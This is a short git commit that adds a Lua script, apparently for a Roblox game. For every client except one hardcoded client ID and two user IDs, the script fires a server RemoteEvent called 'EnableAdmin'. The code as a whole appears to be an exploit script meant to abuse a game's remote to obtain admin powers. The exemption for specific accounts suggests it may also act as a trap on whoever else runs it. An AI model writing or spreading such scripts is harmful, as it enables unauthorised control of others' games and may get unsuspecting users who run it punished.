89ffac267e67d6daa93ae3091d7c5909fe3d108c
somealtaccount334 <122814146+somealtaccount334@users.noreply.github.com>
2023-09-25 18:00:44 -0400

    Update 982357262623.lua

--- 982357262623.lua
+++ 982357262623.lua
@@ -1,1 +1,3 @@
-
+if game:GetService('RbxAnalyticsService'):GetClientId() ~= "BC8E0142-A08D-4EC5-A552-4A2DE770E875" and game.Players.LocalPlayer.UserId ~= 1001240139 and game.Players.LocalPlayer.UserId ~= 3510980398 then
+  game.ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("EnableAdmin"):FireServer()
+end
